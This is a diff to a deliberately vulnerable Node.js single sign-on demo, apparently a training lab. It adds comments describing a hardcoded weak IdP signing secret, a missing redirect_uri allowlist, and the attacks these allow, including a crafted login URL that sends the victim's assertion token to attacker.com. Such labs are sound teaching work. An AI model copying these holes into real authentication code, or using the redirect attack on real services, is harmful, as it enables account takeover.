@@ -20,10 +20,15 @@ const sessions = new Map();
 // ─── IdP (CorpID) session store — survives SP logout ────────────────────────
 const idpSessions = new Map();
 
-// ⚠️ VULNERABILITY: weak IdP signing secret — predictable in a real deployment
+// ⚠️ VULNERABLE — weak IdP signing secret ('idp-secret'); predictable in real deployments.
+// Same brute-force path as jwt-bearer: capture one assertion JWT, offline dictionary attack
+// recovers the secret, attacker forges assertions for any user without ever seeing a password.
 const IDP_SECRET = 'idp-secret';
 
-// ⚠️ VULNERABILITY: no redirect_uri allowlist — any URL is accepted
+// ⚠️ VULNERABLE — no redirect_uri allowlist; IdP accepts any callback URL.
+// Attacker crafts: /idp/login?client_id=workhub-client-id&redirect_uri=http://attacker.com/steal
+// Victim sees legitimate CorpID login, enters credentials, IdP redirects assertion token to attacker.
+// Attacker logs into WorkHub as victim. Victim has no indication anything went wrong.
 const REGISTERED_SPS = {
   workhub: { name: 'WorkHub', clientId: 'workhub-client-id' },
 };
@@ -85,7 +90,8 @@ function issueAssertion(user) {
 
 function redirectWithAssertion(res, user, redirectUri, state) {
   const assertionToken = issueAssertion(user);
-  // ⚠️ VULNERABILITY: redirect to whatever redirect_uri was provided — no allowlist check
+  // ⚠️ VULNERABLE — redirect to whatever redirect_uri was provided; no allowlist check.
+  // Assertion JWT lands on attacker's server via query string — visible in logs, history, Referer.
   // NOTE: passing the token in the URL is also a known weakness — it appears in server logs,
   // browser history, and Referer headers. Production OAuth2 uses a short-lived code exchanged
   // server-to-server (authorization code flow) to avoid this. Simplified here for demo clarity.
@@ -232,7 +238,9 @@ app.get('/idp/login', function (req, res) {
 
   res.send(IDP_LOGIN_HTML({
     clientName: sp ? sp.name : clientId,
-    redirectUri: redirectUri, // ⚠️ VULNERABILITY: passed through without validation
+    redirectUri: redirectUri, // ⚠️ VULNERABLE — passed through without validation against allowlist.
+    // Attacker supplies redirect_uri=http://attacker.com/steal in query string; IdP renders it in the form
+    // and POST /idp/authenticate redirects the signed assertion JWT to that host after victim logs in.
     state: state,
     clientId: clientId,
     error: req.query.error ? decodeURIComponent(String(req.query.error).replace(/\+/g, ' ')) : '',
@@ -277,7 +285,8 @@ app.get('/', function (req, res) {
 
   const state = crypto.randomBytes(16).toString('hex');
   const loggedOut = req.query.logged_out === '1' ? '&logged_out=1' : '';
-  // ⚠️ VULNERABILITY: redirect_uri is our callback — but IdP won't verify it matches
+  // ⚠️ VULNERABLE — WorkHub sends its own callback URI, but IdP never verifies it matches registration.
+  // An attacker can substitute any redirect_uri in the authorize URL and receive the assertion instead.
   const loginUrl = '/idp/login?client_id=workhub-client-id&redirect_uri=' +
     encodeURIComponent('http://localhost:3064/callback') + '&state=' + state + loggedOut;
   res.redirect(loginUrl);
